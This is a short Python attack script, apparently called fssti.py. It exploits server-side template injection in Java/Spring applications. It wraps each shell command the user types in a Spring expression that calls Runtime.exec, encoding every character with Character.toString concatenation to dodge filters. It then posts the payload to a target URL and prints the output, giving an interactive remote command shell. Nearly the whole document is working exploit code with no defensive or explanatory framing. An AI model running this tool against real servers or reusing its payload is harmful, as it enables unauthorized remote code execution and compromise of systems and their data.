#todo: prepend character
#todo: get ip,port, type and param from cmd

import getopt
import sys

import requests


def prepareJavaRequest(request):
    javaRequest = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('
    javaRequest += 'T(java.lang.Character).toString({0})'.format(ord(request[0]))
    for ch in request[1:]:
        javaRequest += '.concat(T(java.lang.Character).toString({0}))'.format(ord(ch))
    javaRequest += ').getInputStream())}'
    return javaRequest

def makePOSTRequest(datafield, command, url):
    data = {datafield : command}
    # sending post request and saving response as response object
    r = requests.post(url=url, data=data)
    return r.text

def main(argv):
    url = ''
    type = 'POST'
    datafield = ''
    command = ''

    try:
        opts, args = getopt.getopt(argv,"hu:t:d:")
        print(opts)
        print(args)
    except getopt.GetoptError:
        print('fssti.py -u <url> -t POST -d <data field>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print('fssti.py -u <url> -t POST -d <data field>')
            sys.exit()
        elif opt in ('-u'):
            url = arg
        elif opt in ('-d'):
            datafield = arg

    print("type quit to quit :)")
    while command != 'quit':
        command = input("$> ")
        response = makePOSTRequest(datafield, prepareJavaRequest(command), url)
        print(response)

if __name__ == '__main__':
    main(sys.argv[1:])
